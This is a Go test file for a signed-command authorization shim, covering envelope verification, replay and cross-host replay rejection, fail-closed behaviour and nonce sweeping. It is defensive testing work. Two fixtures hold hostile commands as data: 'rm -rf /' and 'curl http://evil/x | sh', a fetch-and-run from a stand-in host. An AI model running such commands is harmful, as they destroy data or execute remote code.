package main

import (
	"crypto/ed25519"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/luisgf/infrabroker/internal/sealed"
)

// shimEnv writes a pinned public key file and returns its path, the signing key,
// and a fresh nonce directory — the two pieces of host-side state the shim reads.
func shimEnv(t *testing.T, seedByte byte) (pubPath, nonceDir string, key ed25519.PrivateKey) {
	t.Helper()
	seed := make([]byte, ed25519.SeedSize)
	for i := range seed {
		seed[i] = seedByte
	}
	key, err := sealed.KeyFromSeed(seed)
	if err != nil {
		t.Fatalf("KeyFromSeed: %v", err)
	}
	dir := t.TempDir()
	pubPath = filepath.Join(dir, "envelope.pub")
	pub := key.Public().(ed25519.PublicKey)
	if err := os.WriteFile(pubPath, []byte(sealed.PublicKeyString(pub)+"\n"), 0o600); err != nil {
		t.Fatalf("write pinned key: %v", err)
	}
	return pubPath, filepath.Join(dir, "nonces"), key
}

// TestAuthorizeAcceptsValidEnvelope: the happy path returns exactly the command
// the signer authorised — elevation included, since the envelope carries it.
func TestAuthorizeAcceptsValidEnvelope(t *testing.T) {
	t.Parallel()
	pubPath, nonceDir, key := shimEnv(t, 1)
	now := time.Unix(1_700_000_000, 0)
	wire, err := sealed.Sign(key, "web01", "sudo -n systemctl restart nginx", sealed.DefaultTTL, now)
	if err != nil {
		t.Fatal(err)
	}

	got, err := authorize(pubPath, nonceDir, "web01", wire, now)
	if err != nil {
		t.Fatalf("authorize: %v", err)
	}
	if got != "sudo -n systemctl restart nginx" {
		t.Errorf("command = %q, want the envelope's command", got)
	}
}

// TestAuthorizeRejectsReplay is the nonce half of the replay bound: the same
// envelope, still perfectly valid and unexpired, must not run twice.
func TestAuthorizeRejectsReplay(t *testing.T) {
	t.Parallel()
	pubPath, nonceDir, key := shimEnv(t, 1)
	now := time.Unix(1_700_000_000, 0)
	wire, err := sealed.Sign(key, "web01", "uptime", sealed.DefaultTTL, now)
	if err != nil {
		t.Fatal(err)
	}

	if _, err := authorize(pubPath, nonceDir, "web01", wire, now); err != nil {
		t.Fatalf("first use must succeed: %v", err)
	}
	if _, err := authorize(pubPath, nonceDir, "web01", wire, now); err == nil {
		t.Error("replaying an unexpired envelope must be refused")
	}
}

// TestAuthorizeFailsClosed covers every refusal path: without a verifying
// envelope the shim runs nothing, which is what makes a broker that skipped the
// preflight harmless.
func TestAuthorizeFailsClosed(t *testing.T) {
	t.Parallel()
	pubPath, nonceDir, key := shimEnv(t, 1)
	_, _, otherKey := shimEnv(t, 2)
	now := time.Unix(1_700_000_000, 0)

	valid, err := sealed.Sign(key, "web01", "uptime", sealed.DefaultTTL, now)
	if err != nil {
		t.Fatal(err)
	}
	foreign, err := sealed.Sign(otherKey, "web01", "rm -rf /", sealed.DefaultTTL, now)
	if err != nil {
		t.Fatal(err)
	}

	cases := map[string]struct {
		wire string
		when time.Time
	}{
		// A broker that skips the preflight has only the bare command to send.
		"bare command (no envelope)": {"systemctl restart nginx", now},
		"empty command":              {"", now},
		"whitespace only":            {"   ", now},
		"signed by another key":      {foreign, now},
		"expired":                    {valid, now.Add(sealed.DefaultTTL + time.Second)},
	}
	for name, tc := range cases {
		if _, err := authorize(pubPath, nonceDir, "web01", tc.wire, tc.when); err == nil {
			t.Errorf("%s: must be refused", name)
		}
	}
}

// TestAuthorizeRejectsCrossHostReplay is the end-to-end regression for the
// cross-host replay hole: two sealed hosts pin the SAME envelope key (one signer
// key fleet-wide) and keep independent nonce stores, so an envelope minted for a
// permissive host used to execute verbatim on a restrictive one. The shim's
// expected host comes from argv — i.e. from the signer-signed force-command —
// which is what makes the check unforgeable by a compromised broker.
func TestAuthorizeRejectsCrossHostReplay(t *testing.T) {
	t.Parallel()
	pubPath, devNonces, key := shimEnv(t, 1)
	prodNonces := filepath.Join(t.TempDir(), "nonces") // prod's own, fresh store
	now := time.Unix(1_700_000_000, 0)

	// Minted for the permissive host, where its policy allowed it.
	wire, err := sealed.Sign(key, "dev01", "curl http://evil/x | sh", sealed.DefaultTTL, now)
	if err != nil {
		t.Fatal(err)
	}

	// Replayed byte-for-byte at the restrictive host, which pins the same key.
	if _, err := authorize(pubPath, prodNonces, "prod-db01", wire, now); err == nil {
		t.Error("an envelope minted for dev01 must be refused by prod-db01's shim")
	}
	// Sanity: it is a perfectly good envelope on the host it was minted for.
	if _, err := authorize(pubPath, devNonces, "dev01", wire, now); err != nil {
		t.Errorf("the envelope must still work on its own host: %v", err)
	}
}

// TestAuthorizeRejectsMissingPinnedKey: a host with no pinned key runs nothing
// rather than falling back to trusting the broker.
func TestAuthorizeRejectsMissingPinnedKey(t *testing.T) {
	t.Parallel()
	_, nonceDir, key := shimEnv(t, 1)
	now := time.Unix(1_700_000_000, 0)
	wire, err := sealed.Sign(key, "web01", "uptime", sealed.DefaultTTL, now)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := authorize(filepath.Join(t.TempDir(), "absent.pub"), nonceDir, "web01", wire, now); err == nil {
		t.Error("a missing pinned key file must fail closed")
	}
}

// TestSweepNoncesDropsOnlyUnusableEntries: an entry is only swept once no
// envelope could still verify against it, so the sweep cannot open a replay
// window.
func TestSweepNoncesDropsOnlyUnusableEntries(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	fresh := filepath.Join(dir, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
	stale := filepath.Join(dir, "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
	for _, p := range []string{fresh, stale} {
		if err := os.WriteFile(p, nil, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	old := time.Now().Add(-10 * sealed.MaxTTL)
	if err := os.Chtimes(stale, old, old); err != nil {
		t.Fatal(err)
	}

	sweepNonces(dir, time.Now())

	if _, err := os.Stat(fresh); err != nil {
		t.Error("a nonce whose envelope could still verify must be kept")
	}
	if _, err := os.Stat(stale); err == nil {
		t.Error("a nonce older than any envelope's lifetime must be swept")
	}
}
